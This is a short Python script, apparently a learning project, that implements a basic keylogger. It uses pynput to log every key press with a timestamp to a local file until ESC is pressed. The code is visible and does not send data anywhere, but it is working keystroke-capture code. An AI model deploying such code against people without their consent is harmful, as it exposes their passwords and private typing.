# Shobhit6
from pynput import keyboard
import logging

# Set up logging to a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the pressed key
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        # Handle special keys
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    # Stop listener on ESC key
    if key == keyboard.Key.esc:
        return False

def main():
    print("Keylogger started. Press ESC to stop.")
    # Collect events until released
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
